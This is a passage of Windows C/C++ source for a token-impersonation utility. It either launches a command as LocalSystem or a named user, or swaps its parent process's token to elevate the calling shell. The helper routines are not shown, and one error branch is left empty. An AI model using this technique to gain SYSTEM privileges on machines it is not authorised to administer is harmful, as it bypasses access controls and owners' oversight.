	bool has_cmdline;
	if(!cmdline.empty())
	{
		_tprint(_T("Command line specified. Launching new process as user '%s'.\n\r")
				_T("Executing:\n\r"),
 			((username==NULL)?_T("LocalSystem"):username),
			cmdline.c_str()
			);
		has_cmdline=true;
	}
	else
	{
		_tprint(_T("No command line specified. Elevating current process to user '%s'.\n\r"),
			((username==NULL)?_T("LocalSystem"):username)
			);
		has_cmdline=false;
	}

	// Create token for impersonation
	HANDLE hSuperToken;
	if(!(hSuperToken=ImpersonateSuperToken()))
	{
		_tprint(_T("Unable to impersonate account '%s'.\n\r")
				_T("You may not have permissions to perform this action.\n\r"), 
				((username==NULL)?_T("LocalSystem"):username));
		return 5;
	}

	HANDLE hUserToken=hSuperToken;
	if(username!=NULL)
	{
		hUserToken=GetUserToken(hSuperToken, username);
		if(hUserToken==NULL)
		{
		}
	}

	
	// Depending on presence of command line, perform specified actions
	if(has_cmdline)
	{
		DWORD dwNewProcessId=CreateProcessWithToken(hUserToken,cmdline.c_str());
		if(dwNewProcessId==0)
		{
			_tprint(_T("Unable to create process with token.\n\r")
					_T("You may not have permissions to perform this action.\n\r"));		
			return 8;
		}
		else
		{
			_tprint(_T("Process created successfullly with id %d.\n\r"),
				dwNewProcessId);			
		}
	}
	else
	{
		DWORD dwParentProcessId=GetParentProcessId();
		if(dwParentProcessId==0)
		{
			_tprint(_T("Unable to get parent process id.\n\r")
					_T("You may not have permissions to perform this action.\n\r"));		
			return 6;
		}

		if(!ChangeProcessToken(dwParentProcessId,hUserToken))
		{
			_tprint(_T("Unable to change process token.\n\r")
					_T("You may not have permissions to perform this action.\n\r"));		
			return 7;
		}
	
		_tprint(_T("Token modified successfully for parent process with id %d.\n\r"),
			dwParentProcessId);
	}
	
	return 0;
}

#endif